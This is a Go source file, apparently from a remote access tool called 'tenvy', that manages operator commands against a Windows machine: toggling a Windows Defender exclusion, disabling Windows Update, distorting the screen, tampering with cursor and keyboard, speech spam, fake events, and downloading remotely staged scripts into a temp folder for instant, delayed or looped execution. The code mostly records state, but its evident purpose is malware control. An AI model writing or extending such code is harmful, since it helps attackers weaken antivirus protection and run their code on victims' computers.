package options

import (
	"context"
	"crypto/sha256"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
)

type ScriptFile struct {
	Name     string
	Size     int64
	Type     string
	Path     string
	Checksum string
}

type ScriptPayload struct {
	Data []byte
	Name string
	Size int64
	Type string
}

type ScriptFetcher func(ctx context.Context, token string) (*ScriptPayload, error)

type ManagerOptions struct {
	ScriptDirectory string
}

type ScriptConfig struct {
	File         *ScriptFile
	Mode         string
	Loop         bool
	DelaySeconds int
}

type State struct {
	DefenderExclusion bool
	WindowsUpdate     bool
	VisualDistortion  string
	ScreenOrientation string
	WallpaperMode     string
	CursorBehavior    string
	KeyboardMode      string
	SoundPlayback     bool
	SoundVolume       int
	Script            ScriptConfig
	FakeEventMode     string
	SpeechSpam        bool
	AutoMinimize      bool
}

type Manager struct {
	mu        sync.RWMutex
	state     State
	scriptDir string
}

func NewManager(opts ManagerOptions) *Manager {
	dir := strings.TrimSpace(opts.ScriptDirectory)
	if dir == "" {
		dir = filepath.Join(os.TempDir(), "tenvy", "scripts")
	}
	dir = filepath.Clean(dir)

	return &Manager{
		scriptDir: dir,
		state: State{
			VisualDistortion:  "None",
			ScreenOrientation: "Normal",
			WallpaperMode:     "Default",
			CursorBehavior:    "Normal",
			KeyboardMode:      "None",
			SoundPlayback:     true,
			SoundVolume:       60,
			Script: ScriptConfig{
				Mode: "Instant",
			},
			FakeEventMode: "None",
		},
	}
}

func (m *Manager) Snapshot() State {
	if m == nil {
		return State{}
	}
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.state
}

func (m *Manager) ApplyOperation(ctx context.Context, rawOperation string, metadata map[string]any, fetcher ScriptFetcher) (string, error) {
	if m == nil {
		return "", fmt.Errorf("options manager not initialized")
	}

	operation := strings.TrimSpace(strings.ToLower(rawOperation))
	if operation == "" {
		return "", fmt.Errorf("missing operation")
	}

	switch operation {
	case "defender-exclusion":
		enabled, err := expectBool(metadata, "enabled")
		if err != nil {
			return "", err
		}
		m.mu.Lock()
		m.state.DefenderExclusion = enabled
		m.mu.Unlock()
		if enabled {
			return "Windows Defender exclusion enabled", nil
		}
		return "Windows Defender exclusion disabled", nil

	case "windows-update":
		enabled, err := expectBool(metadata, "enabled")
		if err != nil {
			return "", err
		}
		m.mu.Lock()
		m.state.WindowsUpdate = enabled
		m.mu.Unlock()
		if enabled {
			return "Windows Update enabled", nil
		}
		return "Windows Update disabled", nil

	case "visual-distortion":
		mode, err := expectString(metadata, "mode")
		if err != nil {
			return "", err
		}
		m.mu.Lock()
		m.state.VisualDistortion = mode
		m.mu.Unlock()
		return fmt.Sprintf("Visual distortion set to %s", mode), nil

	case "screen-orientation":
		orientation, err := expectString(metadata, "orientation")
		if err != nil {
			return "", err
		}
		m.mu.Lock()
		m.state.ScreenOrientation = orientation
		m.mu.Unlock()
		return fmt.Sprintf("Screen orientation set to %s", orientation), nil

	case "wallpaper-mode":
		mode, err := expectString(metadata, "mode")
		if err != nil {
			return "", err
		}
		m.mu.Lock()
		m.state.WallpaperMode = mode
		m.mu.Unlock()
		return fmt.Sprintf("Wallpaper mode set to %s", mode), nil

	case "cursor-behavior":
		behavior, err := expectString(metadata, "behavior")
		if err != nil {
			return "", err
		}
		m.mu.Lock()
		m.state.CursorBehavior = behavior
		m.mu.Unlock()
		return fmt.Sprintf("Cursor behavior set to %s", behavior), nil

	case "keyboard-mode":
		mode, err := expectString(metadata, "mode")
		if err != nil {
			return "", err
		}
		m.mu.Lock()
		m.state.KeyboardMode = mode
		m.mu.Unlock()
		return fmt.Sprintf("Keyboard mode set to %s", mode), nil

	case "sound-playback":
		enabled, err := expectBool(metadata, "enabled")
		if err != nil {
			return "", err
		}
		m.mu.Lock()
		m.state.SoundPlayback = enabled
		m.mu.Unlock()
		if enabled {
			return "Sound playback enabled", nil
		}
		return "Sound playback muted", nil

	case "sound-volume":
		volume, err := expectInt(metadata, "volume")
		if err != nil {
			return "", err
		}
		if volume < 0 {
			volume = 0
		}
		if volume > 100 {
			volume = 100
		}
		m.mu.Lock()
		m.state.SoundVolume = volume
		m.mu.Unlock()
		return fmt.Sprintf("Sound volume set to %d%%", volume), nil

	case "script-file":
		fileName, err := expectString(metadata, "fileName")
		if err != nil {
			return "", err
		}
		size, err := expectInt64(metadata, "size")
		if err != nil {
			return "", err
		}
		fileType, _, fileTypeErr := optionalString(metadata, "type")
		if fileTypeErr != nil {
			return "", fileTypeErr
		}
		checksum, hasChecksum, checksumErr := optionalString(metadata, "sha256")
		if checksumErr != nil {
			return "", checksumErr
		}
		token, hasToken, tokenErr := optionalString(metadata, "stagingToken")
		if tokenErr != nil {
			return "", tokenErr
		}

		finalType := strings.TrimSpace(fileType)
		finalSize := size
		finalChecksum := strings.TrimSpace(checksum)
		storedPath := ""

		if hasToken {
			if fetcher == nil {
				return "", fmt.Errorf("script staging token provided but fetcher unavailable")
			}
			payload, err := fetcher(ctx, token)
			if err != nil {
				return "", err
			}
			if payload == nil || len(payload.Data) == 0 {
				return "", fmt.Errorf("staged script payload empty")
			}
			if trimmed := strings.TrimSpace(payload.Name); trimmed != "" {
				fileName = trimmed
			}
			if trimmed := strings.TrimSpace(payload.Type); trimmed != "" {
				finalType = trimmed
			}
			if payload.Size > 0 {
				finalSize = payload.Size
			} else {
				finalSize = int64(len(payload.Data))
			}

			hash := sha256.Sum256(payload.Data)
			computedChecksum := fmt.Sprintf("%x", hash[:])
			if hasChecksum && !strings.EqualFold(finalChecksum, computedChecksum) {
				return "", fmt.Errorf("script checksum mismatch")
			}
			finalChecksum = computedChecksum

			if err := os.MkdirAll(m.scriptDir, 0o755); err != nil {
				return "", fmt.Errorf("prepare script directory: %w", err)
			}

			sanitizedToken := sanitizeComponent(token)
			if sanitizedToken == "" {
				sanitizedToken = "staged"
			}
			sanitizedName := sanitizeComponent(fileName)
			if sanitizedName == "" {
				sanitizedName = "script"
			}
			storedName := sanitizedToken + "-" + sanitizedName
			if len(storedName) > 240 {
				storedName = storedName[:240]
			}
			path := filepath.Join(m.scriptDir, storedName)

			tmp, err := os.CreateTemp(m.scriptDir, "script-*.tmp")
			if err != nil {
				return "", fmt.Errorf("create temporary script file: %w", err)
			}
			tmpName := tmp.Name()
			if _, err := tmp.Write(payload.Data); err != nil {
				tmp.Close()
				os.Remove(tmpName)
				return "", fmt.Errorf("write script file: %w", err)
			}
			if err := tmp.Close(); err != nil {
				os.Remove(tmpName)
				return "", fmt.Errorf("finalize script file: %w", err)
			}
			if err := os.Rename(tmpName, path); err != nil {
				os.Remove(tmpName)
				return "", fmt.Errorf("persist script file: %w", err)
			}
			storedPath = path
			finalSize = int64(len(payload.Data))
		} else {
			m.mu.RLock()
			if existing := m.state.Script.File; existing != nil {
				if storedPath == "" {
					storedPath = existing.Path
				}
				if finalChecksum == "" {
					finalChecksum = existing.Checksum
				}
				if finalSize <= 0 {
					finalSize = existing.Size
				}
				if strings.TrimSpace(finalType) == "" {
					finalType = existing.Type
				}
			}
			m.mu.RUnlock()
		}

		m.mu.Lock()
		var previousPath string
		if hasToken && m.state.Script.File != nil {
			previousPath = m.state.Script.File.Path
		}
		m.state.Script.File = &ScriptFile{
			Name:     fileName,
			Size:     finalSize,
			Type:     finalType,
			Path:     storedPath,
			Checksum: finalChecksum,
		}
		m.mu.Unlock()

		if hasToken && previousPath != "" && previousPath != storedPath {
			_ = os.Remove(previousPath)
		}

		return fmt.Sprintf("Script %s staged", fileName), nil

	case "script-mode":
		mode, err := expectString(metadata, "mode")
		if err != nil {
			return "", err
		}
		loop, hasLoop, loopErr := optionalBool(metadata, "loop")
		if loopErr != nil {
			return "", loopErr
		}
		delay, hasDelay, delayErr := optionalInt(metadata, "delaySeconds")
		if delayErr != nil {
			return "", delayErr
		}

		m.mu.Lock()
		m.state.Script.Mode = mode
		if hasLoop {
			m.state.Script.Loop = loop
		}
		if hasDelay {
			if delay < 0 {
				delay = 0
			}
			m.state.Script.DelaySeconds = delay
		}
		m.mu.Unlock()
		return fmt.Sprintf("Script execution mode set to %s", mode), nil

	case "script-loop":
		loop, err := expectBool(metadata, "loop")
		if err != nil {
			return "", err
		}
		m.mu.Lock()
		m.state.Script.Loop = loop
		m.mu.Unlock()
		if loop {
			return "Script loop enabled", nil
		}
		return "Script loop disabled", nil

	case "script-delay":
		delay, err := expectInt(metadata, "delaySeconds")
		if err != nil {
			return "", err
		}
		if delay < 0 {
			delay = 0
		}
		m.mu.Lock()
		m.state.Script.DelaySeconds = delay
		m.mu.Unlock()
		return fmt.Sprintf("Script delay set to %d seconds", delay), nil

	case "fake-event-mode":
		mode, err := expectString(metadata, "mode")
		if err != nil {
			return "", err
		}
		m.mu.Lock()
		m.state.FakeEventMode = mode
		m.mu.Unlock()
		return fmt.Sprintf("Fake event mode set to %s", mode), nil

	case "speech-spam":
		enabled, err := expectBool(metadata, "enabled")
		if err != nil {
			return "", err
		}
		m.mu.Lock()
		m.state.SpeechSpam = enabled
		m.mu.Unlock()
		if enabled {
			return "Speech spam enabled", nil
		}
		return "Speech spam disabled", nil

	case "auto-minimize":
		enabled, err := expectBool(metadata, "enabled")
		if err != nil {
			return "", err
		}
		m.mu.Lock()
		m.state.AutoMinimize = enabled
		m.mu.Unlock()
		if enabled {
			return "Auto minimize enabled", nil
		}
		return "Auto minimize disabled", nil
	}

	return "", fmt.Errorf("unsupported options operation: %s", rawOperation)
}

func expectBool(metadata map[string]any, key string) (bool, error) {
	value, ok := metadata[key]
	if !ok {
		return false, fmt.Errorf("metadata missing %s", key)
	}
	return coerceBool(value)
}

func optionalBool(metadata map[string]any, key string) (bool, bool, error) {
	if metadata == nil {
		return false, false, nil
	}
	value, ok := metadata[key]
	if !ok {
		return false, false, nil
	}
	coerced, err := coerceBool(value)
	if err != nil {
		return false, false, err
	}
	return coerced, true, nil
}

func coerceBool(value any) (bool, error) {
	switch v := value.(type) {
	case bool:
		return v, nil
	case string:
		trimmed := strings.TrimSpace(strings.ToLower(v))
		switch trimmed {
		case "1", "true", "yes", "on":
			return true, nil
		case "0", "false", "no", "off":
			return false, nil
		}
		return false, fmt.Errorf("cannot interpret %q as boolean", v)
	case float64:
		if v == 0 {
			return false, nil
		}
		if v == 1 {
			return true, nil
		}
		return false, fmt.Errorf("cannot interpret %v as boolean", v)
	default:
		return false, fmt.Errorf("metadata %T cannot be interpreted as boolean", value)
	}
}

func expectString(metadata map[string]any, key string) (string, error) {
	value, ok := metadata[key]
	if !ok {
		return "", fmt.Errorf("metadata missing %s", key)
	}
	str, err := coerceString(value)
	if err != nil {
		return "", err
	}
	if strings.TrimSpace(str) == "" {
		return "", fmt.Errorf("metadata %s cannot be empty", key)
	}
	return str, nil
}

func optionalString(metadata map[string]any, key string) (string, bool, error) {
	if metadata == nil {
		return "", false, nil
	}
	value, ok := metadata[key]
	if !ok {
		return "", false, nil
	}
	coerced, err := coerceString(value)
	if err != nil {
		return "", false, err
	}
	return coerced, true, nil
}

func sanitizeComponent(value string) string {
	trimmed := strings.TrimSpace(value)
	if trimmed == "" {
		return ""
	}

	var builder strings.Builder
	for _, r := range trimmed {
		switch {
		case r >= 'a' && r <= 'z':
			builder.WriteRune(r)
		case r >= 'A' && r <= 'Z':
			builder.WriteRune(r)
		case r >= '0' && r <= '9':
			builder.WriteRune(r)
		case r == '-', r == '_', r == '.':
			builder.WriteRune(r)
		default:
			builder.WriteRune('-')
		}
	}

	sanitized := builder.String()
	sanitized = strings.Trim(sanitized, "-")
	for strings.Contains(sanitized, "--") {
		sanitized = strings.ReplaceAll(sanitized, "--", "-")
	}
	if len(sanitized) > 128 {
		sanitized = sanitized[:128]
	}
	return sanitized
}

func coerceString(value any) (string, error) {
	switch v := value.(type) {
	case string:
		return v, nil
	case fmt.Stringer:
		return v.String(), nil
	case float64:
		return fmt.Sprintf("%g", v), nil
	case int:
		return fmt.Sprintf("%d", v), nil
	case int64:
		return fmt.Sprintf("%d", v), nil
	case uint64:
		return fmt.Sprintf("%d", v), nil
	case bool:
		if v {
			return "true", nil
		}
		return "false", nil
	default:
		return "", fmt.Errorf("metadata %T cannot be interpreted as string", value)
	}
}

func expectInt(metadata map[string]any, key string) (int, error) {
	value, ok := metadata[key]
	if !ok {
		return 0, fmt.Errorf("metadata missing %s", key)
	}
	return coerceInt(value)
}

func optionalInt(metadata map[string]any, key string) (int, bool, error) {
	if metadata == nil {
		return 0, false, nil
	}
	value, ok := metadata[key]
	if !ok {
		return 0, false, nil
	}
	coerced, err := coerceInt(value)
	if err != nil {
		return 0, false, err
	}
	return coerced, true, nil
}

func coerceInt(value any) (int, error) {
	switch v := value.(type) {
	case int:
		return v, nil
	case int32:
		return int(v), nil
	case int64:
		return int(v), nil
	case uint:
		return int(v), nil
	case uint32:
		return int(v), nil
	case uint64:
		return int(v), nil
	case float64:
		return int(v), nil
	case float32:
		return int(v), nil
	case string:
		trimmed := strings.TrimSpace(v)
		if trimmed == "" {
			return 0, fmt.Errorf("cannot interpret empty string as int")
		}
		parsed, err := strconv.ParseInt(trimmed, 10, 64)
		if err != nil {
			return 0, fmt.Errorf("cannot interpret %q as int", v)
		}
		return int(parsed), nil
	default:
		return 0, fmt.Errorf("metadata %T cannot be interpreted as int", value)
	}
}

func expectInt64(metadata map[string]any, key string) (int64, error) {
	value, ok := metadata[key]
	if !ok {
		return 0, fmt.Errorf("metadata missing %s", key)
	}
	return coerceInt64(value)
}

func coerceInt64(value any) (int64, error) {
	switch v := value.(type) {
	case int:
		return int64(v), nil
	case int32:
		return int64(v), nil
	case int64:
		return v, nil
	case uint:
		return int64(v), nil
	case uint32:
		return int64(v), nil
	case uint64:
		return int64(v), nil
	case float64:
		return int64(v), nil
	case float32:
		return int64(v), nil
	case string:
		trimmed := strings.TrimSpace(v)
		if trimmed == "" {
			return 0, fmt.Errorf("cannot interpret empty string as int")
		}
		parsed, err := strconv.ParseInt(trimmed, 10, 64)
		if err != nil {
			return 0, fmt.Errorf("cannot interpret %q as int", v)
		}
		return parsed, nil
	default:
		return 0, fmt.Errorf("metadata %T cannot be interpreted as int", value)
	}
}
